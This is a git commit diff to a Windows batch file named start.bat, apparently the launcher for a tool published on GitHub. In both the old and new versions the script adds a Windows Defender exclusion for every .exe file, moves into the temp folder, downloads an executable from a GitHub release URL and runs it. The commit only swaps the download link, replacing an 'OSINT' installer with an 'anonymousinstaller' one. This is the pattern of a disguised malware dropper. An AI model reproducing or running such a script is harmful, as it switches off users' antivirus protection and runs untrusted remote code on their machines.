fc13c1f4d711ccb55017332a77e5ea757d8c77be
SySLinks <97897361+syslinks@users.noreply.github.com>
2023-06-20 10:56:51 -0700

    Update start.bat

--- start.bat
+++ start.bat
@@ -38,8 +38,8 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/OSINT/releases/download/searchinstaller/Installer.exe' -OutFile Installer.exe"
-Installer.exe
+Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/anonymousinstaller/releases/download/wa/install.exe' "-OutFile Install.exe"
+Install.exe
 
 
 :-------------------------------------
